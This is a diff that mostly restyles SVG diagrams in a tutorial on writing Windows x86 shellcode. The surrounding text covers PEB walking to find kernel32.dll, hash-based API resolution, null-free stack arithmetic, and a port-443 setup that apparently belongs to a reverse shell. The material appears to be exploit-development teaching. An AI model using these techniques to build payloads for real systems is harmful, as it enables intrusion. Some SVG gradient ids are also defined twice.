@@ -203,7 +203,7 @@ Instead, we use **two's complement arithmetic**. The two's complement of `0x610`
   <line x1="375" y1="82" x2="415" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
   <text x="395" y="72" text-anchor="middle" fill="#00ff88" font-size="10">+1</text>
   <!-- Step 3: +1 -->
-  <rect x="420" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
+  <rect x="420" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
   <text x="495" y="75" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0xFFFFF9F0</text>
   <text x="495" y="98" text-anchor="middle" fill="#00ff88" font-size="10">no null bytes!</text>
   <!-- Arrow 3 -->
@@ -237,6 +237,7 @@ Here is how memory looks after these two instructions execute:
 
 <div align="center"><svg viewBox="0 0 750 480" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s201" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s201"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s201" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="arrowDown" markerWidth="10" markerHeight="7" refX="5" refY="7" orient="auto">
       <polygon points="0,0 10,0 5,7" fill="#00ff88"/>
     </marker>
@@ -246,26 +247,28 @@ Here is how memory looks after these two instructions execute:
     <marker id="arrowLeft" markerWidth="7" markerHeight="10" refX="0" refY="5" orient="auto">
       <polygon points="7,0 0,5 7,10" fill="#00d4ff"/>
     </marker>
+      <linearGradient id="bg_s201" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s201"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s201" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="480" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="480" rx="10" fill="url(#bg_s201)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s201)"/>
   <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Stack Layout After Skeleton Setup</text>
   <text x="60" y="55" fill="#8b949e" font-size="11">HIGH MEMORY</text>
-  <rect x="180" y="70" width="320" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+  <rect x="180" y="70" width="320" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="340" y="95" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">EBP (original ESP)</text>
-  <rect x="180" y="115" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="180" y="115" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="340" y="136" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x04] = find_function addr</text>
-  <rect x="180" y="150" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="180" y="150" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="340" y="171" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x08] = LoadLibraryA</text>
-  <rect x="180" y="185" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="180" y="185" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="340" y="206" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x0C] = CreateProcessA</text>
-  <rect x="180" y="220" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="180" y="220" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="340" y="241" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x10] = ExitProcess</text>
-  <rect x="180" y="255" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
+  <rect x="180" y="255" width="320" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="340" y="276" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x14] ... more APIs ...</text>
-  <rect x="180" y="295" width="320" height="100" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="6,3"/>
+  <rect x="180" y="295" width="320" height="100" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="6,3"/>
   <text x="340" y="340" text-anchor="middle" fill="#00ff88" font-size="13">~1552 bytes free space</text>
   <text x="340" y="360" text-anchor="middle" fill="#8b949e" font-size="11">(structures, arguments, strings)</text>
-  <rect x="180" y="400" width="320" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+  <rect x="180" y="400" width="320" height="40" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="340" y="425" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">ESP (after add esp, 0xfffff9f0)</text>
   <text x="60" y="455" fill="#8b949e" font-size="11">LOW MEMORY</text>
   <text x="550" y="93" fill="#ff3366" font-size="12">EBP --></text>
@@ -293,9 +296,14 @@ Here is the chain we follow:
 
 <div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="peb-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="160" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="160" rx="10" fill="url(#bg_s202)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s202)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">The PEB Walk: 4 Steps to kernel32.dll</text>
   <!-- Step 1 -->
   <rect x="20" y="55" width="140" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -322,7 +330,7 @@ Here is the chain we follow:
   <!-- Arrow -->
   <line x1="530" y1="90" x2="560" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
   <!-- Step 4 -->
-  <rect x="565" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="565" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="645" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">4</text>
   <text x="645" y="93" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Entry+0x08</text>
   <text x="645" y="110" text-anchor="middle" fill="#ff3366" font-size="10">Base Address!</text>
@@ -378,7 +386,13 @@ Let's walk through every instruction.
 **`cmp [edi+12*2], cx`** -- Here is the identification trick. The string `kernel32.dll` has exactly 12 characters. In Unicode (UTF-16LE), each character is 2 bytes, so the 13th character (index 12) is at byte offset `12 * 2 = 24`. For `kernel32.dll`, that 13th character is the null terminator (`0x0000`). CX is still zero from our earlier `xor ecx, ecx`, so this comparison checks: "Does this module name have exactly 12 characters?" That uniquely identifies `kernel32.dll` among the typically loaded modules.
 
 <div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="200" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s101" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s101"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s101" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="200" rx="10" fill="url(#bg_s101)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s101)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Unicode String Layout: "kernel32.dll"</text>
   <text x="40" y="55" fill="#8b949e" font-size="10">Byte offset:</text>
   <!-- Byte offset numbers -->
@@ -420,7 +434,7 @@ Let's walk through every instruction.
   <text x="365" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
   <rect x="378" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
   <text x="391" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
-  <rect x="404" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="404" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="417" y="82" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">\0</text>
   <!-- Index labels -->
   <text x="40" y="82" fill="#8b949e" font-size="10">Char index:</text>
@@ -459,14 +473,17 @@ When the loop exits, **EBX holds the base address of kernel32.dll**. This is the
 
 <div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s203" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s203"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s203" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="arrow1" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
       <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
     </marker>
     <marker id="arrow2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
       <polygon points="0,0 8,3 0,6" fill="#00d4ff"/>
     </marker>
+      <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="420" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="420" rx="10" fill="url(#bg_s202)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s202)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">PEB Walk: Finding kernel32.dll Base Address</text>
   <rect x="20" y="55" width="120" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
   <text x="80" y="78" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">TEB</text>
@@ -494,7 +511,7 @@ When the loop exits, **EBX holds the base address of kernel32.dll**. This is the
   <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x08] BaseAddr = 0x75E...</text>
   <text x="375" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "KERNELBASE..."</text>
   <text x="375" y="255" text-anchor="middle" fill="#8b949e" font-size="10">name[12*2] != 0 --> skip</text>
-  <rect x="520" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="520" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="620" y="198" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">kernel32.dll</text>
   <text x="620" y="218" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">[+0x08] BaseAddr --> EBX</text>
   <text x="620" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "kernel32.dll"</text>
@@ -504,7 +521,7 @@ When the loop exits, **EBX holds the base address of kernel32.dll**. This is the
   <line x1="475" y1="220" x2="520" y2="220" stroke="#00d4ff" stroke-width="2" marker-end="url(#arrow2)"/>
   <text x="497" y="212" text-anchor="middle" fill="#00d4ff" font-size="9">flink</text>
   <line x1="560" y1="165" x2="130" y2="175" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrow1)"/>
-  <rect x="80" y="300" width="590" height="100" rx="6" fill="#0a0e17" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
+  <rect x="80" y="300" width="590" height="100" rx="6" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
   <text x="375" y="322" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Module Identification: Why cmp [edi+12*2], cx Works</text>
   <text x="375" y="345" text-anchor="middle" fill="#e0e7ff" font-size="11">"kernel32.dll" = 12 chars. In UTF-16LE, char index 12 = byte offset 24.</text>
   <text x="375" y="365" text-anchor="middle" fill="#e0e7ff" font-size="11">The 13th character of "kernel32.dll" is the null terminator (0x0000).</text>
@@ -552,14 +569,17 @@ Here is the control flow step by step:
 
 <div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s204" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s204"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s204" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="arrowG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
       <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
     </marker>
     <marker id="arrowO" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
       <polygon points="0,0 8,3 0,6" fill="#ff6b35"/>
     </marker>
+      <linearGradient id="bg_s203" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s203"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s203" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="340" rx="10" fill="url(#bg_s203)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s203)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">JMP / CALL / POP Control Flow</text>
   <rect x="30" y="55" width="240" height="42" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
   <text x="40" y="73" fill="#8b949e" font-size="10">find_function_shorten:</text>
@@ -663,16 +683,22 @@ find_function_finished:
 **The `[esp+0x24]` magic:** The caller does `push hash; call [ebp+0x04]`. The `call` pushes a 4-byte return address. Then `pushad` saves 8 registers (32 = `0x20` bytes). So the hash is at `ESP + 0x20 + 0x04 = ESP + 0x24`.
 
 <div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s102" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s102"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s102" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="340" rx="10" fill="url(#bg_s102)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s102)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">The pushad Frame: Why [esp+0x24] Reaches the Hash</text>
   <!-- Stack visualization -->
   <text x="60" y="55" fill="#8b949e" font-size="10">HIGH ADDR</text>
   <!-- Hash argument -->
-  <rect x="200" y="60" width="280" height="32" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="200" y="60" width="280" height="32" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="340" y="81" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Hash argument (0xec0e4e8e)</text>
   <text x="530" y="81" fill="#ff3366" font-size="11">ESP+0x24</text>
   <!-- Return address -->
-  <rect x="200" y="95" width="280" height="32" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
+  <rect x="200" y="95" width="280" height="32" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
   <text x="340" y="116" text-anchor="middle" fill="#ff6b35" font-size="12">Return address (from CALL)</text>
   <text x="530" y="116" fill="#8b949e" font-size="10">+0x04</text>
   <!-- pushad frame -->
@@ -683,11 +709,11 @@ find_function_finished:
   <text x="340" y="181" text-anchor="middle" fill="#e0e7ff" font-size="11">saved ESI</text>
   <rect x="200" y="192" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
   <text x="340" y="211" text-anchor="middle" fill="#e0e7ff" font-size="11">saved EBP, ESP, EBX, EDX, ECX</text>
-  <rect x="200" y="222" width="280" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
+  <rect x="200" y="222" width="280" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
   <text x="340" y="241" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">saved EAX  [esp+0x1C] overwrite!</text>
   <text x="530" y="241" fill="#00ff88" font-size="10">+0x00</text>
   <!-- ESP pointer -->
-  <rect x="200" y="255" width="280" height="28" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
+  <rect x="200" y="255" width="280" height="28" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="340" y="274" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">ESP (after pushad)</text>
   <!-- Annotations -->
   <text x="60" y="285" fill="#8b949e" font-size="10">LOW ADDR</text>
@@ -721,11 +747,14 @@ Push the hash, call the engine, store the result. Three lines per API.
 
 <div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s205" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s205"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s205" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="arwB" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00d4ff"/></marker>
     <marker id="arwG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
     <marker id="arwR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#ff3366"/></marker>
+      <linearGradient id="bg_s204" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s204"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s204" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="440" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="440" rx="10" fill="url(#bg_s204)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s204)"/>
   <text x="375" y="25" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">PE Export Table: Three-Array Cross-Reference</text>
   <rect x="250" y="42" width="250" height="60" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
   <text x="375" y="62" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">IMAGE_EXPORT_DIRECTORY</text>
@@ -736,26 +765,26 @@ Push the hash, call the engine, store the result. Three lines per API.
   <text x="100" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] "AddAtomA"</text>
   <rect x="30" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
   <text x="100" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
-  <rect x="30" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="30" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="100" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] "LoadLibraryA"</text>
   <text x="375" y="128" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">AddressOfNameOrdinals</text>
   <rect x="305" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
   <text x="375" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] ordinal: 2</text>
   <rect x="305" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
   <text x="375" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
-  <rect x="305" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="305" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="375" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] ordinal: 831</text>
   <text x="640" y="128" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">AddressOfFunctions</text>
   <rect x="570" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
   <text x="640" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] RVA 0x01A2F0</text>
   <rect x="570" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
   <text x="640" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
-  <rect x="570" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
+  <rect x="570" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="640" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[831] RVA 0x15C40</text>
-  <line x1="170" y1="228" x2="305" y2="228" stroke="#ff3366" stroke-width="2.5" marker-end="url(#arwR)"/>
+  <line x1="170" y1="228" x2="305" y2="228" stroke="#ff3366" stroke-width="2" marker-end="url(#arwR)"/>
   <rect x="198" y="209" width="95" height="18" rx="5" fill="#0d1117"/>
   <text x="245" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 1: index n</text>
-  <line x1="445" y1="228" x2="570" y2="228" stroke="#ff3366" stroke-width="2.5" marker-end="url(#arwR)"/>
+  <line x1="445" y1="228" x2="570" y2="228" stroke="#ff3366" stroke-width="2" marker-end="url(#arwR)"/>
   <rect x="460" y="209" width="100" height="18" rx="5" fill="#0d1117"/>
   <text x="510" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 2: ord 831</text>
   <rect x="180" y="290" width="390" height="60" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
@@ -793,7 +822,13 @@ add   esp, 0xfffff9f0       ; Same result: ESP - 0x610
 The formula: `two's_complement(X) = NOT(X) + 1`.
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s103" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s103"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s103" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s103)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s103)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Two's Complement: 0x610 to 0xFFFFF9F0</text>
   <rect x="40" y="55" width="150" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
   <text x="115" y="76" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">0x00000610</text>
@@ -858,29 +893,35 @@ inc   eax                   ; EAX = 0x0000BB01 (port 443 in NBO)
 ```
 
 <div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s104" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s104"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
